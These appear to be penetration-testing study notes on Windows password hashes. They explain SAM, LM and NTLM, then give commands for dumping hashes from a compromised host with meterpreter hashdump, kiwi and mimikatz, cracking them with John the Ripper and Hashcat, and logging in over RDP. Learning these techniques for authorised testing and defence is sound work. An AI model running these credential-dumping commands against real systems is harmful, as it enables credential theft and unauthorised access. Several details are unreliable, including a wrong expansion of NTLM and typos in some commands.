## Intro

### Windows Password Hashes
- The Windows O/S stores hashed user account passwords locally in the SAM database.
  - `SAM` : Security Accounts Manager
- Hashing is the process of converting a piece of data into another value. A hashing function or algorith is used to generate the new value. The result of a hashing algorithm is know as a **_hash_** or a **_hash value_**.
- Authentication and verification of user credentials is facilitated by the LSA.
  - `LSA` : Local Security Authority
- This all ties into the LSASS process.
  - `LSASS` : Local Security Authority Subsystem Service
- Windows versions up to Windows Server 2003 utilize two different types of hashes:
  - `LM` : LAN Manager authentication protocol
  - `NTLM` : Network Trust Level Manager
- Windows disabled LM hashing and utilizes NTLM hashing from Windows Vista onward. 

### SAM Database
- The SAM (Security Account Manager) is a database file that is responsible for managing user accounts and passwords on Windows. All user account passwords stored in the SAM database are hashed.
  - The SAM database on Windows is similar to the `/etc/shadow` file on Linux
- The SAM database file cannot be copied while the operating system is running.
- The Windows NT kernel keeps the SAM database file locked and as a result, attackers typically utilize in-memory techniques and tools to dump SAM hashes from the LSASS process.
  - **NOTE:** Elevated/Administrative privileges are required in order to access and interact with the LSASS process.
  - You're probably going to need PrivEsc to be able to dump hashes.
- In modern versions of Windows, the SAM database is encrypted with a `syskey`.

### LM (LanMan -- LAN Manager authentication protocol)
- LM is the default hashing algorithm that was implemented in Windows operating systems prior to NT4.0.
- The protocol is used to hash user passwords, and the hashing process can be broken down into the following steps:
  - The password is broken into two seven-character chunks.
  - All characters are then converted into uppercase.
  - Each chunk is then hashed separated with the DES algorithm.
- LM hashing is generally considered to be a **_weak protocol_** and can easily be cracked, primarily because the password hash does not include salts, consequently making brute-force and rainbow table attacks effective against LM hashes.

### NTLM Hash (or just NTHash)
- NTML is a collection of authentication protocols that are utilized in Windows to facilitate authentication between computers. The authentication process involves using a valid username and password to authenticate successfully.
- From Windows Vista onwards, Windows disables LM hashing and utilizes NTLM hashing.
- When a user account is created, it is encrypted using the MD4 hashing algorithm, while the original password is disposed of.
- NTLM improves upon LM in the following ways:
  - Does not split the hash into two chunks
  - Case sensitive
  - Allows the use of symbols and unicode characters
- These hashes are stored in the SAM database.
- NTHashes do not use salts. Therefore they can be cracked relatively easily (brute-force or rainbow table).

### Dumping & Cracking NTLM Hashes
- We can dump Windows password hashes by leveraging various utilities like...
  - `hashdump` : meterpreter built-in command
  - `mimikatz` : must be uploaded and saved on target hdd
  - `kiwi` : mimikatz extension for meterpreter (no footprint on the target hdd)
- Then we can try to crack those hashes with...
  - John the Ripper
  - Hashcat
- If we cannot crack the hashes, we can try a pass-the-hash with PsExec or CrackMapExec.

## Dump Hashes

### Scenario & Set-Up
- You compromised a Windows target with MetaSploit and have a meterpreter session.
- Do some basic initial enumeration:
```
> sysinfo
> migrate [lsass process number]
  # Since we are going to be interacting with the LSASS process, migrate to that specific process
  # This gives us a 64-bit meterpreter session on the target 64-bit architecture (more stable)
  # This gives us more stability when interacting with the LSASS process to dump hashes.
> getuid
  # if we have access as Administrator, no privesc needed
> getprivs
  # confirm we have admin privs
```

### Meterpreter Command: hashdump

#### The command
- From your meterpreter session, issue the command...
```
hashdump
```
- You can run the same thing via the MSF module `post/windows/gather/hashdump`
- The hashdump post module will dump the contents of the SAM database ([resource](https://www.offsec.com/metasploit-unleashed/meterpreter-basics/#hashdump)).

#### The Format
- Observe the format of the output... (colon delimited)
```
Administrator:500:b512c1f3a8c0e7241aa818381e4e751b:1891f4775f676d4d10c09c1225a5c0a3:::
# Field #1: username   : Administrator
# Field #2: RID        : 500
# Field #3: LM Hash    : b512c1f3a8c0e7241aa818381e4e751b
# Field #4: NTLM Hash  : 1891f4775f676d4d10c09c1225a5c0a3
```
- Field #1: username
- Field #2: RID (Relative Identification), which is the last 3-4 digits of the SID (Security Identifier)
- Field #3: LM Hash
- Field #4: NTLM Hash

#### Copy Results
- Copy the results you want to crack into a text file (e.g., hashes.txt)
```
Administrator:500:b512c1f3a8c0e7241aa818381e4e751b:1891f4775f676d4d10c09c1225a5c0a3:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

### Meterpreter Built-In Extension: [Kiwi](/mimikatz.md#meterpreter-built-in-extension-kiwi)
> Assuming the same scenario: you have compromised a Windows target with MetaSploit and currently have access via a meterpreter session. Because we are dinkin' around with the LSA, we should migrate our meterpreter session to lsass.exe. That will be more stable.
- Kiwi allows us to dynamically execute Mimikatz on the target system without touching the disk (uploading mimiktaz.exe to the target will save it to the hard drive).
```
> load kiwi
> help              # at the bottom of the help file you will get the kiwi module help
> creds_all         # retrieve all credentials
> lsa_dump_sam      # dump the sam database contents
> lsa_dump_secrets  # dump the lsa secrets (unparsed)
```
- This will give you basically the same results as `hashdump` above (copy into a text file: hashes.txt).
- `load kiwi` : Should get visible feedback of successful load
- `creds_all` : will try to get everything; might give you the NTLM has of the administrator account
- `lsa_dump_sam` : This dumps the cached contents of the SAM db
  - REMEMBER: The SAM db is encrypted with a "syskey" and mimikatz/kiwi just gave you that key with this dump.
- `lsa_dump_secrets` : In SOME cases this MIGHT provide you with clear text credentials.
- If you are working within an AD (Active Directory) environment, you can run the kerberos dumps and/or create a golden ticket.
- Handy Kiwil command: `password_change`
  - This is NOT something you'd want to do in an enterprise environment pentest (b/c you'll change an actual account password and/or hash).

### [Mimikatz on the Target](/mimikatz.md#mimikatz-on-the-target)
> Same scenario... If you wanted, you could upload the mimikatz Windows executable to the target (onto the target's hard drive).

#### Upload mimikatz.exe
- With your meterpreter session, navigate to the root of the target, create a Temp subdir for your files.
```
> upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
  # Kali comes with various Windows executables, and mimikatz.exe is one of them.
> shell
  # gets you a cmd on the target
```

#### Run mimikatz.exe on the Target
- In the cmd shell on the target...
```
dir                       # should see mimikatz.exe in your Temp dir
mimikatz.exe              # start it up... you get the mikikatz environment and prompt
privilege::debug          # check your privs
                          # if you get "Privilege | 20 | OK" you have sufficient privs to execute
lsadump::sam              # should give you the cache dump: syskey, samkey, hashes
lsadump::secrets          # same results as with kiwi in msf
sekurlsa::logonpasswords  # IF there are clear-text pwds, you'll see them; else Password: (null).
```
- `sekurlsa::logonpasswords` : Some Windows systems are configured to store users' logon passwords in clear text. Mimikatz can find these.

## Crack Hashes
> Assumption: You have password hashes in a file named hashes.txt from the activies described above.

### John the Ripper
- Open the help file and take a look on how to use the utility:
```
john
```
- We'll need to first indicate the format of the hash we want to crack.
- From the help file: `--format=NAME` : force hash of type NAME
- List out the supported formats you can choose from:
```
john --list=formats
```
- Whittle that list down a bit; "NT" is the notation for NTLM:
```
john --list=formats | grep NT
```
- Run it:
```
john --format=NT hashes.txt --wordlist=/path/to/your/wordlist
# or use the default:
john --format=NT hashes.txt
```
- If you don't specify a wordlist you want to use, John the Ripper will use its own default wordlist.
- REMEMBER:
  - If you had not been able to crack the NTML hashes and get plaintext passwords... 
  - You can always try to get in via SMB using PsExec (and pass the hash; see below).
- Cracked passwords can be used to login via RDP, SSH, etc.

### Hashcat
- Open the help menu and familiarize yourself with the usage
```
hashcat --help
```
- There are two things you need to specify:
  - `-m, --hash-type` :  That is followed by the Hashcat hash ID number; scroll down in the help file; find NTLM... (should be 1000)
  - `Attack Mode` : Scroll down in the help file, find the **[ Attack Modes ]** section. Note the number of the attack you want to  perform (us:  #3 - Brute Force).
- Farther down in the help file you get **[ Basic Examples ]**.
- Following the "Brute-force" attack mode (and following the example syntax in the help file): 
```
hashcat -a 3 -m 1000 hashes.txt /use/share/wordlists/rockyou.txt
```
- Lots of output. Scroll up to check it out

## Use the Hashes
- If RDP port 3389 is open on the target machine, use xfreerdp to log in remotely
```
xfreerpd /u:Administrator /p:password /v:[target ip]
```
